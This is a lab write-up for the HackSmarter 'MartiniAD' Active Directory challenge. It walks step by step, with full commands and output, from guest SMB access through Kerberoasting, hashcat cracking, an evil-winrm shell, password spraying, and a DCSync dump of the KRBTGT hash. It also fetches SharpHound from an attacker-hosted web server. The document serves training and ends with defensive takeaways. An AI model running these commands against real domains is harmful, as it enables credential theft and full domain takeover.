[🇬🇧 English](README.md) | [🇫🇷 Français](README.fr.md)

---

# MartiniAD (Easy) — HackSmarter

**Target:** 10.1.123.189 (DC01)
**OS:** Windows Server 2025 Build 26100
**Domain / DC:** DRY.MARTINI.BARS / DC01.DRY.MARTINI.BARS
**Difficulty:** Easy
**Category:** Active Directory
**Platform:** HackSmarter (hacksmarter.org)

---

## Challenge Objective

> An adult beverage company "Martini Bars" recently had a corporate breach and the compliance and risk team dictates they perform a penetration test at one of their branch offices. The Hack Smarter team has been authorized to perform an internal black box pentest.
>
> **Initial Access:** The client has provided you with VPN access to their internal network, but no credentials.
>
> **Goal:** Retrieve the KRBTGT NT hash.

![Challenge objective screenshot](screenshots/00-challenge-objective.png)

---

## Attack Chain Summary

```
Port scan → AD services identified on DC01
  → SMB share enumeration (no creds) → "notes" share reachable
    → Guest session on "notes" → plaintext creds for mprice
      → Authenticated LDAP/SMB user enumeration → user list incl. ATHENA_SVC, athena.t0
        → Kerberoasting ATHENA_SVC (has an HTTP SPN)
          → Offline hashcat crack → ATHENA_SVC password recovered
            → WinRM access confirmed as ATHENA_SVC (Remote Management Users)
              → SharpHound collection → BloodHound CE graph analysis
                → No exploitable ACL path found from ATHENA_SVC
                  → Credential spray: ATHENA_SVC's password against all enumerated users
                    → Hit: athena.t0 — local Administrator on DC01
                      → secretsdump (DRSUAPI / DCSync) as athena.t0
                        → KRBTGT NT hash extracted
```

---

## 1. Reconnaissance — Port Scan

### Theory
Before touching Active Directory specifically, a full TCP port scan tells us what kind of host we're facing. A machine exposing 88 (Kerberos), 389/636 (LDAP/LDAPS), 445 (SMB), 3268/3269 (Global Catalog) together is almost always a Domain Controller — this shapes every subsequent step (we know we're attacking AD, not a random Windows box).

```bash
nmap -p- -sV 10.1.123.189
```

**Output:**
```
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
```

**Finding:** the full AD service stack is present (DNS, Kerberos, LDAP, SMB, Global Catalog, WinRM, ADWS) → **this is a Domain Controller.**

![nmap scan results](screenshots/01-nmap-scan.png)

---

## 2. Domain and DC Identification

### Theory
SMB and LDAP banners leak the domain name, hostname, OS build, and — critically — whether SMB/LDAP signing is enforced. Signing status matters later: SMB signing disabled means NTLM relay attacks against this host would be viable (not needed in this path, but worth noting for the report).

```bash
nxc smb 10.1.123.189
nxc ldap 10.1.123.189
```

**Output:**
```
SMB   10.1.123.189   445   DC01   [*] Windows 11 / Server 2025 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
LDAP  10.1.123.189   389   DC01   [*] Windows 11 / Server 2025 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:Enforced) (channel binding:No TLS cert)
```

**Finding:** domain is `DRY.MARTINI.BARS`, DC hostname `DC01`. SMB signing is **disabled** (noted as a finding for the report, not exploited in this path). LDAP signing is enforced, which later breaks some legacy enumeration tools (see step 10).

![domain identification](screenshots/02-domain-identification.png)

---

## 3. SMB Share Enumeration (No Credentials)

### Theory
Before assuming we need credentials, it's standard practice to check what an **unauthenticated** or **NULL** session can reach. Windows SMB historically allows anonymous users to at least *list* share names (not necessarily browse their contents) unless explicitly hardened. This costs nothing and often reveals custom (non-default) shares that hint at misconfiguration — here, a share named `notes` stands out immediately next to the standard `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`.

```bash
enum4linux-ng -A 10.1.123.189
```

**Output (relevant section):**
```
=================================( Share Enumeration on 10.1.123.189 )=================================

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        notes           Disk
        SYSVOL          Disk      Logon server share

[+] Attempting to map shares on 10.1.123.189

//10.1.123.189/ADMIN$   Mapping: DENIED Listing: N/A    Writing: N/A
//10.1.123.189/C$       Mapping: DENIED Listing: N/A    Writing: N/A
//10.1.123.189/IPC$     Mapping: OK     Listing: DENIED Writing: N/A
//10.1.123.189/NETLOGON Mapping: DENIED Listing: N/A    Writing: N/A
//10.1.123.189/notes    Mapping: OK     Listing: DENIED Writing: N/A
//10.1.123.189/SYSVOL   Mapping: DENIED Listing: N/A    Writing: N/A
```

**Finding:** an anonymous/NULL session can **map** (connect to) the `notes` share, but cannot **list** its contents directly through this tool. The share's existence and partial accessibility (Mapping: OK) is the signal that it's worth a manual, interactive connection attempt with different credential types (NULL, then Guest) rather than the automated listing this tool attempted.

![SMB share enumeration](screenshots/03-share-enumeration.png)

---

## 4. Initial Access — Guest Session on the "notes" Share

### Theory
"Mapping: OK, Listing: DENIED" means the SMB tree connect succeeds but the specific enumeration method the tool used was rejected — this does **not** mean the share is unreadable, only that this particular automated check failed. The next logical step is to connect manually with `smbclient` and try the handful of credential types that commonly work on misconfigured shares: NULL session first, then the built-in `Guest` account (which is often enabled, even if disabled by default on modern Windows, in lab/training environments).

```bash
smbclient //10.1.123.189/notes -U 'guest'
```

**Output:**
```
user GUEST accepted
smb: \> ls
smb: \> get note.txt
...

- Order more gin for lakeside
- Look for an engagement ring
- Check that notes works from Linux Mint

creds
mprice:[REDACTED]
```

**Finding:** Guest access succeeded where NULL session had failed, and the share contains a plaintext note with a username/password pair: `mprice:[REDACTED]`. This is a classic misconfiguration — an internal note dropped onto a world-readable share — and becomes our first foothold.

![Guest access to notes share](screenshots/04-guest-smb-notes.png)

---

## 5. Authenticated User Enumeration

### Theory
With one valid low-privilege credential, we move from unauthenticated to **authenticated** enumeration, which is far richer: SMB `--users` (via SAMR) and LDAP `--users` both return the full list of domain accounts, their last password-set date, and bad password count. This is how we discover accounts we didn't know existed, including anything with an unusual or suggestive naming convention.

```bash
nxc smb 10.1.123.189 -u 'mprice' -p '[REDACTED]' --users
```

**Output:**
```
SMB   10.1.123.189   445   DC01   [+] DRY.MARTINI.BARS\mprice:[REDACTED]
SMB   10.1.123.189   445   DC01   -Username-      -Last PW Set-        -BadPW- -Description-
SMB   10.1.123.189   445   DC01   Administrator    2026-01-12 16:00:19  0       Built-in account for administering the computer/domain
SMB   10.1.123.189   445   DC01   Guest            <never>              0       Built-in account for guest access to the computer/domain
SMB   10.1.123.189   445   DC01   krbtgt           2026-01-17 01:19:20  0       Key Distribution Center Service Account
SMB   10.1.123.189   445   DC01   mprice           2026-01-17 16:40:55  0
SMB   10.1.123.189   445   DC01   athena.t0        2026-01-20 18:20:44  0
SMB   10.1.123.189   445   DC01   ATHENA_SVC       2026-01-20 18:20:32  0
SMB   10.1.123.189   445   DC01   [*] Enumerated 6 domain users: DRY
```

**Finding:** six domain accounts total. Two stand out from the generic built-ins: `ATHENA_SVC` (naming convention of a service account) and `athena.t0` (naming convention often used for a **tier-0** — i.e. highly privileged — administrative account). Both share the prefix "athena", which will become relevant later.

![authenticated user enumeration](screenshots/05-user-enumeration.png)

---

## 6. Kerberoasting

### Theory — what is an SPN, and why Kerberoasting works
A **Service Principal Name (SPN)** uniquely identifies a service instance on the network (e.g. `HTTP/athena.dry.martini.bars`, `MSSQLSvc/sql01:1433`). It lets a client request a Kerberos service ticket (TGS) for that specific service instead of talking to it directly. The Key Distribution Center (KDC, i.e. the DC) issues this TGS encrypted with the **NTLM hash / Kerberos key of the account that owns the SPN** — usually a dedicated service account, not a machine account.

Critically, **Kerberos allows any authenticated domain user to request a TGS for any SPN that exists**, with no special privilege required — this is normal, intended behavior (how else would a client know in advance which service it will call?). The request itself generates no suspicious log entry; it's indistinguishable from legitimate service access.

The vulnerability isn't in the protocol — it's in **credential hygiene**: the TGS is only as strong as the service account's password. Since we now hold this TGS offline, we can brute-force it without touching the DC again, with no account lockout risk (Kerberos pre-auth failures lock out accounts; offline cracking of an already-issued ticket does not).

```bash
impacket-GetUserSPNs dry.martini.bars/mprice:'[REDACTED]' -dc-ip 10.1.123.189 -request
```

**Output:**
```
ServicePrincipalName          Name        MemberOf                                                        PasswordLastSet             LastLogon  Delegation
-----------------------------  ----------  ---------------------------------------------------------------  --------------------------  ---------  ----------
HTTP/athena.dry.martini.bars   ATHENA_SVC  CN=Remote Management Users,CN=Builtin,DC=DRY,DC=MARTINI,DC=BARS  2026-01-20 18:20:32.856622  <never>

$krb5tgs$23$*ATHENA_SVC$DRY.MARTINI.BARS$dry.martini.bars/ATHENA_SVC*$[REDACTED]
```

**Finding:** `ATHENA_SVC` is the only account carrying an SPN (`HTTP/athena.dry.martini.bars`) and is a member of **Remote Management Users** (WinRM access) — making it a high-value Kerberoasting target: cracking it won't just give domain credentials, it will give a remote shell.

![Kerberoasting ATHENA_SVC](screenshots/06-kerberoasting.png)

---

## 7. Offline Cracking

### Theory
The TGS blob retrieved above (`$krb5tgs$23$...`) is a standard **hashcat mode 13100** (Kerberos 5, etype 23, TGS-REP) format. Cracking it is a dictionary/brute-force attack against the service account's password, entirely offline — no further network interaction with the target.

```bash
hashcat -m 13100 athena_svc.hash /usr/share/wordlists/rockyou.txt
```

**Output:**
```
$krb5tgs$23$*ATHENA_SVC$DRY.MARTINI.BARS$...:[REDACTED]

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
```

**Finding:** `ATHENA_SVC` password recovered (rockyou.txt hit). This confirms the account used a dictionary-crackable password — a weak credential policy on service accounts.

![hashcat crack result](screenshots/07-john-crack.png)

---

## 8. Validating Access and Obtaining a Shell

### Theory
Before doing anything else, validate the cracked credential against multiple protocols. `nxc` flags `(Pwn3d!)` when the account grants interactive/administrative access on that protocol — here it confirms `ATHENA_SVC` is both a valid SMB account **and** has usable WinRM access, consistent with its "Remote Management Users" group membership found earlier.

```bash
nxc smb 10.1.123.189 -u ATHENA_SVC -p '[REDACTED]'
nxc winrm 10.1.123.189 -u ATHENA_SVC -p '[REDACTED]'
```

**Output:**
```
SMB   10.1.123.189 445  DC01  [+] DRY.MARTINI.BARS\ATHENA_SVC:[REDACTED]
WINRM 10.1.123.189 5985 DC01  [+] DRY.MARTINI.BARS\ATHENA_SVC:[REDACTED] (Pwn3d!)
```

```bash
evil-winrm -i 10.1.123.189 -u ATHENA_SVC -p '[REDACTED]'
```

**Finding:** interactive PowerShell shell obtained on DC01 as `ATHENA_SVC`. `whoami /priv` and `whoami /groups` (not shown in full) confirmed this is a **standard, non-privileged domain user session** — no local admin rights, no notable token privileges beyond defaults (`SeMachineAccountPrivilege`, `SeChangeNotifyPrivilege`). This rules out trivial local privilege escalation and pushes the methodology toward Active Directory–wide analysis (BloodHound) rather than host-local privesc.

![WinRM shell as ATHENA_SVC](screenshots/08-evilwinrm-shell.png)

---

## 9. DNS Configuration (Prerequisite for BloodHound Collection)

### Theory
Both the BloodHound Python collector and Kerberos itself are hostname-sensitive: Kerberos SPNs and LDAPS SNI validation expect the attacking machine to resolve the DC's FQDN correctly. Without this, LDAP/LDAPS binds and Kerberos authentication to tools expecting the FQDN will fail even with valid credentials.

```bash
echo "10.1.123.189 dc01.dry.martini.bars dry.martini.bars DC01" | sudo tee -a /etc/hosts
sudo bash -c 'echo "nameserver 10.1.123.189" > /etc/resolv.conf'
```

**Finding:** name resolution confirmed working via `ping dc01.dry.martini.bars` and `nslookup dry.martini.bars 10.1.123.189`.

![DNS configuration](screenshots/09-dns-config.png)

---

## 10. Active Directory Collection — SharpHound / BloodHound CE

### Theory
With no further local privesc avenue and a confirmed foothold, the standard next step in an AD assessment is to map the domain's **relationships** — group memberships, ACLs, sessions, delegation settings — rather than guessing. BloodHound ingests this data and models it as a graph, letting us query for any path from our current principal (`ATHENA_SVC`) to a high-value target (Domain Admins, DCSync rights, etc.) using graph traversal instead of manual cross-referencing.

SharpHound is the official collector (.NET binary) run **on a domain-joined session** — here, from inside our WinRM shell on DC01 itself, which by definition has full visibility into the domain.

```powershell
# From the evil-winrm shell
iwr -uri http://<KALI_IP>:8000/SharpHound.exe -outfile C:\Users\ATHENA_SVC\SharpHound.exe
.\SharpHound.exe -c All -d dry.martini.bars
download 20261019140556_BloodHound.zip
```

The resulting `.zip` was uploaded into BloodHound Community Edition (self-hosted via `bloodhound-cli`) through **Download Collectors → Upload Files**.

**Finding:** collection successful — 6 users, computers, groups, GPOs, and OUs ingested into the graph.

![SharpHound collection and BloodHound CE upload](screenshots/10-sharphound-upload.png)

---

## 11. Attack Path Analysis

### Theory
With the graph populated, the first query in any BloodHound-driven assessment is: *"from my current principal, is there a direct ACL/membership path to Domain Admins or to DCSync rights?"* This is checked via the Pathfinding tab (source = our compromised principal, destination = the domain or the Domain Admins group).

**Query:** Pathfinding from `ATHENA_SVC@DRY.MARTINI.BARS` → `DRY.MARTINI.BARS`

**Result:** the only edge found was `ATHENA_SVC —[CanPSRemote]→ DC01`, which simply restates the WinRM access we already had. **No ACL-based escalation path** (GenericAll, WriteDacl, ForceChangePassword, AddMember, etc.) exists from `ATHENA_SVC` toward Domain Admins or any DCSync-capable principal.

![BloodHound pathfinding — no ACL path found](screenshots/11-bloodhound-no-path.png)

**Finding:** graph-based privilege escalation is a dead end from this account. This is an important, honest finding to document — BloodHound does not always hand over a path; when it doesn't, the methodology has to fall back to credential-based techniques.

---

## 12. Credential Reuse Testing (Password Spraying)

### Theory — why this step, and why BloodHound cannot reveal it
Password/credential reuse across accounts is an **operational habit**, not a structural AD relationship — it exists only in the mind of whoever set the passwords. It leaves zero trace in LDAP attributes, group memberships, or ACLs, so **no graph tool can detect it**. The only way to discover it is to actively test the credential we hold against every other known account.

This is standard methodology once ACL-based paths are exhausted: take any valid credential and spray it across the full user list gathered in step 5, rather than guessing blindly. The shared `athena` naming prefix between `ATHENA_SVC` and `athena.t0` made the latter a priority candidate, but the spray was run against the complete list, not just that one guess.

```bash
nxc smb 10.1.123.189 -u users.txt -p '[REDACTED]' --continue-on-success
```

**Output:**
```
SMB   10.1.123.189 445 DC01 [+] DRY.MARTINI.BARS\athena.t0:[REDACTED] (Pwn3d!)
SMB   10.1.123.189 445 DC01 [-] DRY.MARTINI.BARS\Administrator:[REDACTED] STATUS_LOGON_FAILURE
SMB   10.1.123.189 445 DC01 [-] DRY.MARTINI.BARS\mprice:[REDACTED] STATUS_LOGON_FAILURE
SMB   10.1.123.189 445 DC01 [-] DRY.MARTINI.BARS\krbtgt:[REDACTED] STATUS_LOGON_FAILURE
```

**Finding:** `ATHENA_SVC`'s password is **reused** on the `athena.t0` account — and `nxc` flags it `(Pwn3d!)`, meaning this account has local administrative rights on DC01. This is the real pivot of the chain, and it is a credential-hygiene failure, not an AD misconfiguration that any graph tool could have surfaced.

![Credential spray hit on athena.t0](screenshots/12-password-spray-hit.png)

---

## 13. Privilege Confirmation

```bash
nxc smb DC01.DRY.MARTINI.BARS -u 'athena.t0' -p '[REDACTED]' --shares
```

**Output:**
```
SMB 10.1.123.189 445 DC01 [+] DRY.MARTINI.BARS\athena.t0:[REDACTED] (Pwn3d!)
SMB 10.1.123.189 445 DC01 Share    Permissions  Remark
SMB 10.1.123.189 445 DC01 ADMIN$   READ,WRITE   Remote Admin
SMB 10.1.123.189 445 DC01 C$       READ,WRITE   Default share
```

**Finding:** full read/write access to `ADMIN$` and `C$` confirms local Administrator rights on the Domain Controller for `athena.t0`. On a DC, local Administrator **is** Domain Admin-equivalent — this account can read the domain's secrets database.

![admin shares confirmation](screenshots/13-admin-shares.png)

---

## 14. Domain Secrets Extraction (DCSync)

### Theory — what secretsdump does here
`secretsdump.py` has several extraction modes. Against a Domain Controller with a privileged account, it defaults to the **DRSUAPI method**, which performs a **DCSync**: it impersonates another domain controller and asks the target DC to *replicate* its directory secrets — including every account's NTLM hash and Kerberos keys, and crucially the `krbtgt` account's secret key. This requires the `Replicating Directory Changes` and `Replicating Directory Changes All` extended rights, which local Administrators / Domain Admins on a DC implicitly hold. No code execution on the DC is needed; this is a legitimate (abused) AD replication RPC call.

The `krbtgt` account's key is what the KDC uses to sign **every** Kerberos TGT issued in the domain — this is the exact secret the lab asked us to retrieve, and it is also the key required to forge "Golden Tickets" in a real engagement.

```bash
impacket-secretsdump dry.martini.bars/athena.t0:'[REDACTED]'@10.1.123.189
```

**Output (redacted):**
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:[REDACTED]:[REDACTED]:::
Guest:501:[REDACTED]:[REDACTED]:::
krbtgt:502:[REDACTED]:[REDACTED]:::
DRY.MARTINI.BARS\mprice:1104:[REDACTED]:[REDACTED]:::
DRY.MARTINI.BARS\athena.t0:1105:[REDACTED]:[REDACTED]:::
DRY.MARTINI.BARS\ATHENA_SVC:1106:[REDACTED]:[REDACTED]:::
DC01$:1000:[REDACTED]:[REDACTED]:::
```

**Finding — KRBTGT NT hash:** `[REDACTED]`

![secretsdump DCSync output](screenshots/14-secretsdump-krbtgt.png)

---

## Key Takeaways

- **Unauthenticated/Guest SMB access is still common** in misconfigured environments — always test NULL and Guest sessions against every discovered share before assuming credentials are required.
- **Never store credentials in plaintext files on a network share**, even an "internal notes" share. This single note was the entire initial foothold of the chain.
- **Kerberoasting requires no special privilege** — any domain user can request a TGS for any SPN. Service accounts with SPNs must use long, random, non-dictionary passwords (ideally Group Managed Service Accounts, which rotate automatically).
- **BloodHound models structural AD relationships, not operational habits.** It will never reveal password reuse, because that information doesn't exist in LDAP attributes or ACLs. When graph analysis hits a dead end, falling back to credential spraying against the full enumerated user list is the correct next methodological step — not a lucky guess.
- **Naming conventions are a targeting heuristic, not proof.** `ATHENA_SVC` and `athena.t0` sharing a prefix justified testing that account first during the spray, but the spray was still run against the full user list rather than relying on a single assumption.
- **Local Administrator on a Domain Controller is equivalent to Domain Admin.** Once that foothold on `athena.t0` was confirmed, DCSync via `secretsdump` was a direct path to every secret in the domain, including `krbtgt`.
- **The `krbtgt` hash is the single most sensitive secret in an AD domain** — it enables golden ticket forgery and domain-wide persistence. Protecting it (and rotating it twice after any suspected compromise) is a top incident-response priority.

---

## Tools Used

| Tool | Role |
|---|---|
| `nmap` | Port scanning and service/version detection |
| `netexec` (`nxc`) | SMB/LDAP/WinRM authentication testing, user enumeration, credential spraying |
| `enum4linux-ng` | Unauthenticated SMB share enumeration |
| `smbclient` | Manual interactive SMB share access (Guest session) |
| `impacket-GetUserSPNs` | Kerberoasting — SPN enumeration and TGS extraction |
| `hashcat` | Offline cracking of the Kerberos TGS-REP hash (mode 13100) |
| `evil-winrm` | Interactive PowerShell shell over WinRM |
| `SharpHound` | Active Directory data collection for BloodHound |
| `BloodHound CE` (`bloodhound-cli`) | AD attack path graph analysis |
| `impacket-secretsdump` | DCSync — domain secrets / KRBTGT extraction |

---

## References

- [MITRE ATT&CK T1558.003 — Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- [MITRE ATT&CK T1003.006 — DCSync](https://attack.mitre.org/techniques/T1003/006/)
- [Impacket — Fortra GitHub](https://github.com/fortra/impacket)
- [NetExec (nxc) — GitHub](https://github.com/Pennyw0rth/NetExec)
- [BloodHound Community Edition — SpecterOps](https://github.com/SpecterOps/BloodHound)
- [SharpHound Collector — SpecterOps](https://github.com/SpecterOps/SharpHound)
- [Hashcat — Kerberos 5 TGS-REP etype 23 (mode 13100)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [Microsoft Learn — KRBTGT Account Overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
